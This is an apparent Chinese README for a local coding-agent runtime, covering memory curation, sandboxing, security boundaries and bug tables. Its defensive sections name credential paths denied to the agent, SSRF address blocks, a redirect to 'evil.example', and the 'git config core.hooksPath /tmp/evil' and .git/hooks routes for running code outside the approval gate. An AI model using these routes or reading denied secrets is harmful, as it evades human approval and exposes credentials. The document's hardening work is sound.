**失败模式**：curator 原本让模型判 `add / update / duplicate / none`，`update` 会调用 `invalidate_memory` 把旧记忆**从检索里隐藏**。而「这条新事实取代那条旧的」这个判断**没有可靠先验**——两条事实往往是互补而非矛盾（「住在纽约」和「搬到了旧金山」），判错的代价是**一条事实静默地、永久地消失**。

mem0 v3 把写时调和整个删掉、改成 ADD-only，LongMemEval 涨了 26 分（时序推理 51 → 93）。本项目的 curator 正是那个被废弃的形态。

**改法**：默认 `memory.allow_supersede = false`，模型的动作只剩 `add / duplicate / none`。矛盾保留、由检索端看到，而不是被谁藏起来。**schema 的 enum 也一起收窄**，不是事后拒绝——被提供了 `update` 的模型一定会用它。而且**运行时不只靠提示词**：provider 忽略 `response_format` 时，代码里还有一道，因为这里的要点是「事实不能因为一次模型判断而消失」。

这和本项目既有的原则是同一条：**模型不能批准自己的工具，也不能销毁自己的记忆。**

`memory.allow_supersede = true` 可以恢复旧行为——一个必须保持精简的库是正当需求，只是它不是默认值，而默认值是那个**不会丢数据**的。

---

## 与 OpenClaw / Hermes 的关系，以及哪些差距**不该**补

先直接回答：**不是各方面都优于它们，而且不应该追求这个。** 三者不是同一类东西。

| | 本项目的定位 | OpenClaw / Hermes 的定位 |
|---|---|---|
| 形态 | 一个**运行时**（内核 + 库 + CLI + 服务层） | 一个**个人助理平台**（常驻、多渠道、有插件生态） |
| 强项 | 执行语义的严谨性：可中断可恢复、写前台账、权限闸门、可回退、审计可查 | 触达面：飞书/微信/Telegram 等渠道、cron、设备、浏览器、插件市场 |
| 典型用法 | `uaa run "修这个 bug"`，或作为库被别的系统调用 | 挂在渠道上，随时被消息唤起 |

**它们有而本项目没有的**：渠道适配器、常驻调度（cron）、浏览器操作、插件市场、TS SDK。

**其中大部分不该补**，理由不是"没时间"，是**补了会让这个项目更差**：

| 差距 | 结论 | 理由 |
|---|---|---|
| 渠道适配器 | **不做** | 单机自用不产生价值，却把 prompt-injection 面和鉴权面从"一个受控入口"扩大成"N 个不可控入口"。要接渠道，正确的做法是让渠道服务调用本项目的 HTTP/A2A 层，而不是把渠道塞进内核 |
| TypeScript SDK | **不做** | 没有第三方消费者时，它是纯维护负担。已经有 OpenAPI（`/docs`）和 A2A，需要时按需生成 |
| 浏览器操作 | **缓** | CDP 的维护成本很高，而多数编码任务用 shell + `http_get` 已经覆盖。真需要时，它应该是一个 MCP server，而不是内核的一部分 |
| 代码库索引 / repo map | **不做** | Aider 的 tree-sitter + PageRank repo map 是好东西，但 Anthropic 明确主张 agent 用 **just-in-time 检索**（grep/glob + 渐进式揭示），理由是陈旧索引和复杂语法树是坑。本项目的 `search_files` 已经是这个形状——**这里是对的，别改** |
| 插件市场 | **不做** | 单用户场景下 Skills + MCP 已经覆盖，市场是给多租户平台准备的 |

**它们没有而本项目有的**（这些是真正值得保留的差异）：

- **可中断可恢复 + 写前台账**：崩溃后能区分「肯定没跑」和「可能跑过」，非幂等调用标记 `ambiguous` 并让模型去验证，而不是盲目重跑
- **文件级回退**：`uaa task rewind` 能把一个任务改过的文件按检查点还原。它们能回放会话，回不了工作区
- **六档强制权限 + 执行向量防护**：`.git/hooks`、`.git/config` 这类「延迟执行的代码」被钉死不可写——写一个 hook 等于在审批闸门之外植入代码
- **拒绝让模型销毁数据**：记忆不允许被模型判定「已被取代」而隐藏（见下），工具审批也不允许模型自己批准
- **A2A v1.0**：跨组织边界的标准协议，含 SSRF 三重防线与不可信卡片审查
- **零依赖内核**：SQLite + 标准库，不需要 Node 运行时

**一句话**：它们擅长「随时被叫到」，本项目擅长「被叫到之后做得对、且出错能收场」。要渠道，把本项目当成后端接进去，不要把它改造成渠道平台。

---

## 桌面端：系统 webview，不是 Electron

窗口是**操作系统自己的 webview**（macOS 上 WKWebView）套在**同一个服务、同一个控制台**外面。没有第二套 UI，没有第二套构建系统，没有捆绑 Chromium。

为什么不是 Electron / Tauri：

| | 代价 |
|---|---|
| Electron | 每个应用 ~150MB，并且往一个刻意不带 npm 的仓库里塞进 npm |
| Tauri | 二进制更小，但要在 Python 项目里维护 Rust + Node 工具链，只为开一个窗口 |
| **pywebview** | 一个依赖，三行代码开窗口，复用现有全部前端 |

诚实的代价：默认打出来的是**启动器 bundle**（用构建时的解释器跑已安装的包），不是自包含二进制 —— 移动或删除那个虚拟环境会让应用失效。`--bundle` 的输出里会明说这一点。要自包含就得上 PyInstaller（`--frozen` 会告诉你缺什么，而不是半途失败）。

**应用图标是纯标准库画出来的**：手写 PNG 编码器 + macOS 自带的 `iconutil`。为一个图标引一个绘图库，对一个以「零依赖」为卖点的项目不值。

`.app` 里有什么：`Info.plist`（含 bundle id、版本、图标引用）、可执行启动脚本、`AppIcon.icns`。启动脚本在解释器不见了时会**说清楚并回退**到 PATH 上的 `python3` —— 双击之后毫无反应是最糟的结果。

---

## 进程隔离：macOS 用 Seatbelt，Docker 作为可选后端

```bash
uaa sandbox        # 报告实际生效的是哪个后端，并真的试一次越界写入
```

```bash
uaa sandbox --report    # 报告 + 把机器可读结果写到 <home>/sandbox-verify.json
```

`uaa config set sandbox.mode read-only` 会让**项目目录含 `.git` 全部只读** —— `git log/diff/show/blame` 能用，`commit/checkout/fetch` 和文件编辑全部失败。**「分析这个项目」和「修改这个项目」是两个不同的档位**，不该共用一份权限配置。

> **必须在普通终端里跑。** macOS **拒绝**从「已经被沙箱化的进程」安装更窄的 profile（`sandbox_apply: Operation not permitted`）—— 容器里、以及任何会给子进程套沙箱的环境里都探测不到。`uaa sandbox` 会检测到这种情况，并打印一条**可直接粘贴**的命令。

报告里带**环境指纹**，因为「这台机器上 Seatbelt 不能用」和「这里测不了」导向相反的决定，而单看探测结果分不出来：

```json
{
  "environment": { "inside_parent_sandbox": true, "sandbox_marker_count": 90, ... },
  "probe": { "ok": false, "detail": "sandbox_apply: Operation not permitted" },
  "builtin_profile": { "ok": false, "detail": "..." },
  "verdict": "...this run was itself inside a sandbox, so the probe result says nothing about this machine"
}
```

`builtin_profile` 是**第二个数据点**：`sandbox-exec -n no-network` 用的是 Apple 自带的 profile。它和生成的 profile 以同样方式失败，就说明问题不在生成的 profile 上——这排除了最容易得出的错误结论。

如果探测失败但环境是干净的，用 `--bisect` 定位是哪条规则被拒：

```bash
uaa sandbox --bisect      # 逐条试，并把候选修法一起测掉
```

它同时回答两个问题：**哪条规则导致拒绝**，以及**替代写法能不能用、是否仍然挡得住越界写入**。一次跑完，不用来回两轮。

失败模式是可区分的，这个区分很关键：

| rc | 含义 |
|---|---|
| `65` + 消息 | profile **语法有问题**（`unbound variable: X` / `syntax error: expecting ')'`） |
| `71` 或无消息的信号 | profile 语法没问题，是在 **apply 阶段被拒** |
| `0` | 装上了 |

判定逻辑用**两个对照**：`(allow default)` 通过只能证明「空操作 profile 被接受」，证明不了「能装下真正收窄的 profile」。少一个对照就会把「嵌套沙箱」误判成「deny default 是触发点」。

威胁模型是抄 Codex / Gemini CLI 的，而且理由充分：

> **anti-tampering, not anti-exfiltration** —— 读是全开的，锁的是写。

Agent 必须读代码、读配置、读工具链；读也锁死它就废了。而「写」可以精确白名单。

**可用性是探测出来的，不是假定的。** 二进制存在不等于能用：在已经被沙箱化的进程里，macOS **拒绝**安装一个更窄的 profile。所以 `available` 会真的去应用一个限制性 profile 试一次——用 `(allow default)` 探测是无效的，那在任何环境都通过，正好掩盖了要防的失败。

**回退一定留痕。** `wrap()` 在后端不可用时会直通（不能让坏沙箱废掉所有命令），但 `uaa run/chat/serve/doctor` 都会打出告警。静默降级到无隔离，比没有隔离更糟。

诚实的限制，`uaa sandbox` 会全部打出来：网络是放开的（**不是出口防火墙**）；`npm login`/`gh auth login` 在沙箱内会失败（它们要**写**凭据文件）；macOS 的 Keychain 经 Mach IPC 的写入挡不住；`sandbox-exec` 被 Apple 标记为弃用。

---

## 安全边界（明确说明）

- API key **只**从环境变量读，从不写盘。
- 日志与**产物**都过脱敏（外置 200KB 工具输出这件事，如果不过脱敏等于把刚 `cat` 的 key 落盘）。
- `.env`、`~/.ssh/**`、`*.pem`、`~/.aws/**` 等即使在 `READ_ONLY` 也拒绝（`.env.example` 等模板除外）。
- `run_command` 永远 `shell=False`，参数经 `shlex.split` 后作为 argv 执行。
- **命令判定分三层，且读的是参数不只是命令名**：deny 模式（原文）→ forbidden 前缀 / flag（argv）→ sticky CONFIRM（argv）→ allowlist（命令名）。`git config core.hooksPath` 能写 `.git/config`（也就是文件围栏钉不住它，因为 git 自己写），`python3 -c` 与 `python3 刚写的脚本` 都是任意代码——所以「允许 python3」被拆成了「可以跑，但永远要问」。这一层 `--yes` 压不掉。
- `http_get`/`http_post` 的重定向**逐跳**复检白名单 —— 一个被允许的主机 302 到 `evil.example` 不会被静默跟随。
- 沙箱：第一版用「路径围栏 + 命令白名单 + 环境脱敏」，**没有** Docker。Docker 每条命令 3 秒起的开销不值得，第二版做成可插拔。
- **A2A 出站请求三重防线**：scheme 必须是 http/https → host 必须在 `a2a.allow_hosts`（默认空 = 谁也不调）→ **解析后的地址必须是公网**（`127.0.0.1` / `169.254.169.254` / `10.x` / `::1` 全拦）。第三条是经典的绕过，也是最常被跳过的检查。重定向逐跳复检，**卡片自己的 `url` 也要过检查**——有效的卡片不等于可信的卡片。
- **远端 Agent Card 按不可信输入处理**：schema 校验 + 复用技能安全审查的 prompt-injection 检测器扫 `name`/`description`/每个 skill 的描述。
- **执行向量一律不可写**：`.git/hooks/**`、`.git/config`、`.git/modules/**/config` 即使在工作区内也拒绝写入。理由不是「敏感数据」——读一个 hook 是有用的，agent 应该知道项目跑什么——而是**写入会让代码在之后执行，在审批闸门之外**。这道检查在 `decide` 的围栏步骤里，**`--yes` 覆盖不了它**。
- **agent 自己的策略与审计日志不可写**：`config.toml` 与 `uaa.db`。正常情况下它们在 workspace 之外、围栏已经挡住；但把 workspace 设成 home 目录会把它们包进来，而「agent 改自己的权限或自己的审计记录」不是任何人的本意。
- **检查点是唯一不脱敏的产物**：它存在的意义是**逐字节写回**，脱敏过的副本还原出来是坏文件。内容是工作区里已有的文件，同一个信任域。

**A2A 明确没做的两件事**（规范点名，但属于部署关注点而不是库的事）：

- **Signed Agent Cards（JWS）**：不验证签名，因此无法证明卡片确实由声称的签发方发布。要用在生产环境，需要一层会校验 JWS 并固定可信签发方的网关。
- **重放防护（nonce + 短生命周期 token）**：服务端依赖 HTTP 层的 bearer token，没有 per-request nonce 或时间戳校验。

两件事都没有「部分实现」——宁可整项缺失并写明，也不要一个看起来生效的半成品。

---

## 尚未实现（刻意）

第一版刻意只做「一个 Agent 能可靠完成一个真实开发任务，且开发者清楚它做了什么」。以下按路线图延后：

| 阶段 | 内容 |
|---|---|
| Phase 2 | ✅ FastAPI + SSE/WebSocket（AG-UI）、✅ 沙箱（Seatbelt / Docker） |
| Phase 3 | ✅ 向量记忆与矛盾处理、✅ 技能审核流程（候选可见 + 状态持久化 + CLI/API 推进） |
| Phase 4 | ✅ YAML 工作流、✅ 多 Agent（orchestrator-worker）、✅ A2A v1.0（Card + JSON-RPC + SSE） |
| Phase 5 | ✅ Web 控制台（零构建）、⛔ TypeScript SDK（无消费者，纯负担）、⛔ 渠道适配器（见下一节的理由） |

调研与采纳决策见 [`docs/phase2-5-research.md`](docs/phase2-5-research.md)。

多 Agent **默认关闭**：token 消耗约 15×，而且调研明确说编程任务不适合它。做成「显式开启 + 预算闸门 + 角色可配」，理由和实测数字见上面的多 Agent 一节。

A2A **两个方向都默认关闭**：发布一个接受别的 Agent 派活儿的端点是个决定，调用别人也是。而且调用方向的核心防线是 `a2a.allow_hosts` 为空即「谁也不调」。

---

## 开发

```bash
.venv/bin/python -m pytest -q                       # 702 条，全部离线，不需要 API key
.venv/bin/python -m pytest tests/test_resume_semantics.py -v
.venv/bin/ruff check src tests
```

测试套件的设计目标：**不需要网络、不需要密钥就能跑真实 agent 循环**。需要 API key 的测试套件等于不会跑的测试套件。

`ScriptedModel` 让整个循环可控可断言：结构化输出（规划）交给确定性 mock，循环回合按脚本走。崩溃用「插入写前台账行」来模拟——这正是真实崩溃留下的东西。

多 Agent 的并发测试需要**按别名分发**的模型注册表：`ScriptedModels` 对任何别名都返回同一个实例，而并发子 Agent 共用一份脚本游标会互相吃掉对方的步骤——正是这个功能要避免的那种共享。

### 测试抓到的静默缺陷

下面这些都不是"功能没写"，是**代码看起来对、行为不对**。列出来是因为它们是这类系统的主要风险：

| 缺陷 | 为什么危险 |
|---|---|
| 恢复后 `steps_used` 归零 | **步数预算可被无限重置**——预算不再是预算 |
| 批准后的工具调用会丢失 | 恢复时重新问模型，模型重新决策，被批准的那个调用**静默消失** |
| `TextProtocolModel` 没实现抽象方法 | 降级路径根本实例化不了；只有本地模型用户会撞上 |
| 搜索 `**/*.py` 漏掉根目录文件 | `fnmatch` 的 `*` 匹配 `/`，所以 `**/*.py` 要求路径里必须有斜杠 |
| macOS 上 `/private/var/folders` 被判为系统目录 | 权限围栏变成误报制造机，temp 目录全不可写 |
| `created_at` 同毫秒并列 | 任务列表顺序不确定 |
| **Rich 把输出里的 `[a-zA-Z]` 当成标记吃掉** | 正则、pytest 的 `[100%]`、TOML 的 `[models.x]` 全部静默变形 |
| `run_tests` 在 venv 项目里找不到 pytest | 环境脱敏顺带把 venv 的 PATH 也清了 |
| JSONL 日志建了 sink 但没接线 | 事件日志永远是空的 |
| **事件总线的 `publish` 被当成 `emit` 调用，异常被吞** | 事件一条都进不了总线，SSE 流永远空转 |
| **AG-UI 编码器返回 dict，调用方按 list 迭代** | `for x in dict` 迭代的是键 —— `RUN_FINISHED` 从未发出，线上只有 `data: "type"` |
| `@dataclass` 默认 `eq=True` 使订阅者不可哈希 | 加进 `set` 直接崩；测试全绿是因为没人订阅 |
| WebSocket 只转发实时事件、不回放历史 | 晚连的客户端永远挂住 |
| 沙箱不可用时 `wrap` 静默直通 | 用户配了 Seatbelt 却在裸跑，没人告诉他 |
| **判定逻辑写反** | `escaped` 非空意味着写入**逃逸了**，却返回「已阻断」—— 报告会给出与事实相反的结论 |
| 可粘贴命令里的路径没加引号 | 项目路径含空格（`WorkBuddy AI`），粘贴即失败 |
| **健康探测不带令牌** | 令牌默认开启，于是 `uaa desktop` 每次都会报「服务起不来」，而服务其实好好的 |
| **`iconutil` 要求目录名以 `.iconset` 结尾** | 起错名一律报 "Invalid Iconset"，而失败原因被吞成「iconutil 不可用」 |
| 打包用 `rmtree` 清理中间产物 | 递归删除撞上删除护栏，打包直接崩；改成暂存目录 + 重命名换入 |
| `--check` 却先要求 GUI 可用 | 它存在的意义就是在没有 GUI 的地方验证，结果在 CI 上必然失败 |

### 第二轮：声明了但没接线

上一批是「代码看起来对、行为不对」。这一批是同一类问题的一个子类，而且更难发现，因为**它不产生任何错误**：字段照常出现在 `uaa config show` 里，事件类型照常能 import，类型检查全过、测试全绿、答案也对——只是那个功能悄悄什么都没做。

| 缺陷 | 为什么危险 |
|---|---|
| `permissions.shell.max_output_bytes` / `permissions.network.max_response_bytes` / `memory.vector_limit` 三个字段**没有任何代码读取** | 用户在 `config show` 里改它们，看到成功，然后以为生效了。默认值和硬编码常量恰好相同，所以改了也看不出来 |
| **七个 `EventType` 从不 emit**（`MODEL_ERROR` / `MODEL_RETRY` / `TOOL_REPLAYED` / `MEMORY_SEARCHED` / `SKILL_LOADED` / `NODE_SKIPPED` / `MODEL_REQUEST`） | 审计链看起来完整，唯独你最需要看的那一件事不在里面：重试了几次、哪个调用是崩溃后重放的、召回到底跑了没有 |
| **候选目录只写不读** | Agent 写出的技能候选落在磁盘上，然后对所有命令**不可见**。README 宣称「人工闸门」，但人连待审的东西都看不到——闸门没有可闸之物 |
| **技能状态阶梯只活在内存里** | `promote()` 改的是一个变量。下一个进程看到的仍是目录默认值，于是「阶梯」每次重启归零 |
| `skill_runs` 表只写不读 | schema 承诺它回答「这个技能到底有没有用」，但没有任何读取路径，`deprecate` 只能凭感觉 |
| **反射只接在 CLI 上** | `uaa run --reflect` 会学习，`POST /agui` 启动的任务永远不写记忆、不产候选。同一个内核能力只从两个入口里的一个可达 |
| **`config_to_toml` 手写节列表** | `uaa config set` 是读-改-写：序列化器不认识的节会被**从文件里删掉**。手写的 `[permissions.network] allow_domains` 在有人改一次步数预算时无声消失 |
| **`_hoist_effect_keys` 把策略表当成决策值** | `network` 既是效果类名、又是 `[permissions.network]` 表名。它无条件 `pop("network")`，把网络白名单塞进了决策映射 |
| **上面两条互相掩盖** | 序列化器从不写 `permissions.network`，所以校验器的越界一直没被触发。修好序列化器的那一刻，另一个 bug 立刻冒出来——两个缺陷叠在一起，表现是「什么都没发生」 |
| `config set` 的路径只支持 `agent.*` / `models.*` | `memory.vector_limit`、`sandbox.mode`、`multi_agent.enabled` 都是文档里的旋钮，CLI 却拒绝设置。只能手改 TOML 的配置项，等于大多数人永远找不到 |
| `setattr` 不做校验 | pydantic 默认只在构造时校验。`config set sandbox.mode read-only` 存下的是裸字符串，类型悄悄不再是 `SandboxMode`——今天比较相等，第一次用 `is` 就崩 |
| `list_skill_runs` 按毫秒时间戳排序 | 同一毫秒写入的两条记录顺序不定。**和任务列表那个缺陷一模一样**，说明「毫秒精度不够」是一条会复发的规律，不是一次性 bug |
| `state.loaded_skills` 从不被写入 | 技能效果归因的唯一来源是空的，于是 `skill_runs` 即使接了线也只会记 0 条 |
| `AgentState.retry_count` 从不被读、也从不被写 | 删除它。模型重试次数现在从 `MODEL_RETRY` 事件里数得出来，比维护一个可能漂移的计数器更可靠 |
| **`ModelCapabilities.parallel_tool_calls` / `max_output_tokens`** | 三个适配器都声明了，零处读取。`max_output_tokens` 还和 `ModelSpec` 的同名字段重复——两处设置同一个值，其中一处被忽略 |
| **`ModelCapabilities.vision`** | 没有任何代码读它，而运行时**无法在消息里放图片**。这个标志只能误导 |
| **`Store.find_resumable`** | 读投影的定点查询，而 `resume` 必须从事件折叠判断——「这个任务能不能恢复」的第二个、更陈旧的答案 |
| **`SkillRegistry.allowed_tools_for`** | 一个「按技能声明自动授予工具」的脚手架，而本项目**刻意不做**这件事：权限引擎是唯一权威 |
| **`db.connect(read_only=True)` 实现正确、无人调用** | 一个没人用过的模式等于没验证过的模式。而所有只读命令都在开可写连接——**能写的读路径就是 bug 会毁库的读路径** |
| `sessions.metadata` 参数存在、无人读 | 直到 A2A 需要它才接线：远端任务必须记得对端是谁 |
| `config set` 拒绝一切列表 | `a2a.allow_hosts`、`permissions.network.allow_domains`、`multi_agent.allowed_effects` 都是文档里的设置，却只能手改 TOML——**前两个是安全设置**，最不该让人找不到 |

**这一批带走的经验（续）：**

4. **审计脚本自己会有它要找的那类 bug。** 第一版 `public_methods` 排除了整个声明文件，于是「类内部自己调用的方法」全被误报——11 个假阳性盖住 15 个真问题。规则改成「总出现次数减去声明本身」之后信号才干净。**用工具得出的结论，先怀疑工具。**
5. **「能跑的」和「验证过的」不是一回事。** `read_only=True` 实现是对的，但从未被任何调用点走过——等于一段没人验证过的代码。接线之后才有测试证明它真的挡得住写。
6. **列表设置必须能从 CLI 设。** 拒绝一切列表的代价是把几个安全设置变成只有手改 TOML 才可达。标量列表用逗号分隔就够了，`mcp_servers` 那种「表的列表」才该留在文件里。

### 第三批：只有真跑才会暴露的两个缺陷

这两条是**用真实模型（DeepSeek-V4.1-Flash）跑一个真任务**时抓到的。测试全绿、审计零发现，它们照样在。

| 缺陷 | 为什么危险 |
|---|---|
| **任务的 workspace 没有被持久记录** | session 里记了 `working_dir`，但 task 自己不记。于是 `uaa task approve <id>` 从别的目录执行时，**后续每个工具调用的落点都被静默换掉**：模型以为在 A 目录，而路径围栏是按「恢复进程的目录」建的、放行的是 B。两个答案，错的那个赢了。对一个以「可中断可恢复」为卖点的系统，这是硬伤 |
| **模型返回空内容时被报告为 `completed`** | 推理模型把输出预算花在推理上、然后一个字都不输出，是**常见形状**；而运行时把它当成一个成功完成的空答案。任务「成功」了、什么都没做，这正是这个项目最想避免的那一类 |

两条都是**「声明/记录存在，但代码不读它」**的变体——和第一、二批同一个根因，只是这次要靠运行才发现，审计脚本看不见它们，因为涉及的字段都被引用了。

**带走的经验：**

7. **跑一次真的，比再读一遍代码有用。** 前两批是静态审计抓的，这两批只有真跑才现形——一条是跨进程的状态丢失（静态看每处都对），一条是运行时对「模型什么都没说」的分类错误。**审计脚本的盲区是「引用存在但语义错」，只有运行能覆盖。**
8. **持久化的记录必须被读回来。** workspace 记在 session 里、任务自己却没有——「记录存在」和「记录被使用」是两件事。凡是有持久记录的地方，都要问一句：**谁读它？读到的是不是同一份？**

### 第四批：对标业界时发现的四个机制缺口

对着 OpenHands / Aider / Cline / SWE-agent / goose / Codex CLI / Gemini CLI / Letta / mem0 / smolagents 做了一轮对比（见「从做得好的项目里抄来的四件事」）。四条都是**只有在对比时才看得出来**的：测试全绿、审计零发现，因为它们不是「声明了没接线」，而是**机制本身不存在或形状不对**。

| 缺口 | 为什么危险 |
|---|---|
| **`.git/hooks` 可写**（已修，但修得不完整——见下一条） | agent 没有 shell 元字符、每条命令过白名单、每个效果等级都被闸门管着——**然后它写了 `.git/hooks/pre-commit`**，之后任何一次 `git commit`（任何人、任何时间）都会执行它。审批闸门全程没参与：代码在**之后**执行，在所有检查之外。`.git/config` 是另一扇同样的门（`core.hooksPath` / `core.pager` / `credential.helper` / `alias.*`） |
| **没有文件回退** | 运行时能把状态回放到任意一步，却回不了文件。它清楚知道是哪一步毁掉的工作区，**但放不回去** |
| **`apply_patch` 顺序相关** | 依次替换看着等价于对原文解析，实际会让后一条编辑匹配到前一条刚插入的文本——**模型的意图被静默反转**，文件看起来被编辑过而且是错的 |
| **旧条目被整条丢弃** | 把旧工具结果压成更小的正文仍然花 token；预算耗尽时最老的条目整条消失，于是模型失去「我做过什么」的记录，会重跑那些它已经看不到结果的调用 |
| **记忆允许被模型隐藏** | curator 让模型判 `add/update/duplicate/none`，`update` 会把旧记忆**从检索里隐藏**。「这条取代那条」没有可靠先验（互补 ≠ 矛盾），判错就是**一条事实静默永久地消失** |
| **上一轮对 `.git/hooks` 的修复不完整** | 文件围栏钉住了 `.git/config` 这个**路径**，但 `git config core.hooksPath /tmp/evil` 是 **git 自己**去写它——围栏看不见命令内部的写入。同一个执行向量，换了一扇门。**修一个洞之后要问「还有别的门通向这里吗」** |
| **命令白名单按命令名匹配** | `head == basename(entry)` 意味着「允许 `python3`」等于「允许一切」。`python3 -c "..."` 当时被挡住**只因为 `(` 是元字符**——偶然挡住，不是设计挡住；有人为别的需求打开 `allow_metacharacters` 就没了 |

**带走的经验（续）：**

9. **对标不是列功能表，是找「它解决的那个具体失败模式」。** 上面五条没有一条是「别人有我没有」的功能——`apply_patch` 我也有，只是形状错了。**问「他们为什么这样做」比问「他们做了什么」有用得多。**
10. **同时要明确「哪些差距不该补」。** 渠道适配器、TS SDK、浏览器、repo map、插件市场——这五项按功能表都该补，按「对单机个人 coding agent 的价值」都该跳过，理由写在「与 OpenClaw / Hermes 的关系」一节里。**对齐功能列表本身是一种失败模式。**
11. **修完一个洞要问「还有别的门通向这里吗」。** 我上一轮把 `.git/config` 按**路径**钉死，却没想过 `git config` 是 git 自己写它——同一个执行向量换了扇门。**按「它是什么」防护会漏掉「谁能写它」**；这类问题要靠「把攻击面按**能力**而不是按**对象**列一遍」才看得出来。
12. **偶然挡住 ≠ 设计挡住。** `python3 -c "..."` 当时确实被拒，但理由只是 `(` 恰好是元字符。**一个靠副作用成立的防线，会在别的需求改动它依赖的那个条件时静默失效。** 判断一条防护是否可信，要问「它是为什么被挡住的」。

**这一批带走的经验：**

1. **「声明了」和「接线了」是两件事，而且前者看起来和后者完全一样。** 死字段、死事件、死表不会报错、不会让测试变红、不会让答案变错。唯一的防线是**针对每个声明面写一条断言「它的值改变了某个可观测结果」**——`tests/test_wiring.py` 就是这条防线，它开头写的规则是「这个文件里提到的每一个字段和事件，都必须有一条断言证明它影响了行为」。
2. **两个缺陷可以互相掩盖，而且表现是「一切正常」。** `config_to_toml` 的遗漏恰好让 `_hoist_effect_keys` 的越界永远不触发。这类组合不会在任何一个缺陷被单独测试时暴露——只有把其中一个修好，另一个才现形。所以修完一个地方要重跑**全量**，不要只跑相关的那几个。
3. **配置的读-改-写必须有全量往返测试。** 序列化器漏一个节不是「少写一行」，是「静默删除用户的设置」。`tests/test_config_round_trip.py` 遍历整个配置面而不是列一遍今天的节，所以以后新增字段忘了序列化会**测试失败**，而不是吃掉用户的配置。

## License

MIT
